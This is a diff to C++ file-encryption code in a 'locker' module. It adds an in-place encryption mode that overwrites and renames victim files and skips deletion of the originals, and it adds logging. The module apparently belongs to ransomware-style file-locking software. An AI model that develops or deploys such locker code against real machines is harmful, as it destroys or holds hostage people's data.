@@ -488,8 +488,12 @@ bool locker::SetOptionFileInfo(PFILE_INFO FileInfo, PDRIVE_INFO data, CRYPT_INFO
 		LOG_ERROR("[SetOptionFileInfo] [ParseFile] Failed; " log_str, data->Filename);
 		return false;
 	}
-
-	if (!filesystem::CreateFileOpen(FileInfo) || FileInfo->newFileHandle == INVALID_HANDLE_VALUE)
+	
+	if(GLOBAL_STATE.g_write_in)
+	{
+		FileInfo->newFileHandle = FileInfo->FileHandle;
+	}
+	else if (!filesystem::CreateFileOpen(FileInfo) || FileInfo->newFileHandle == INVALID_HANDLE_VALUE)
 	{
 		LOG_ERROR("[SetOptionFileInfo] [CreateFileOpen] Failed; " log_str, data->Filename);
 		return false;
@@ -506,9 +510,14 @@ void locker::free_file_info(PFILE_INFO FileInfo, bool success)
 		api::CloseDesc(FileInfo->newFileHandle);
 
 	if (!success) SecureDelete(FileInfo->newFilename);
-	else if (GLOBAL_STATE.g_FlagDelete)
+	else if (GLOBAL_STATE.g_FlagDelete && !GLOBAL_STATE.g_write_in)
+	{
 		if (!SecureDelete(FileInfo->FilePath))
 			LOG_ERROR("[SecureDelete] Failed; " log_str, FileInfo->Filename);
+	}
+	else if(GLOBAL_STATE.g_write_in)
+		rename(FileInfo->FilePath, FileInfo->newFilename);
+	
 	memory::m_free(FileInfo->newFilename);
 	if (FileInfo->CryptInfo->gen_policy == GENKEY_EVERY_ONCE && FileInfo->ctx) memory::m_free(FileInfo->ctx);
 	memory::memzero_explicit(FileInfo, sizeof(FileInfo));
@@ -520,6 +529,7 @@ bool locker::HandlerCrypt
 	PDRIVE_INFO data
 )
 {
+	LOG_INFO("process file; " log_str, data->Filename);
 	bool success = false;
 	FILE_INFO FileInfo;
 	if (!(success = SetOptionFileInfo(&FileInfo, data, CryptInfo)))
@@ -539,8 +549,10 @@ bool locker::HandlerCrypt
 			isCrypt ? FileInfo.Filename : FileInfo.newFilename
 		));
 
-
-	LOG_SUCCESS("success encrypt file; " log_str, data->Filename);
+	if(success)
+		LOG_SUCCESS("success encrypt file; " log_str, data->Filename);
+	else
+		LOG_ERROR("failed encrypt file; " log_str, data->Filename);
 
 END:
 	free_file_info(&FileInfo, success);
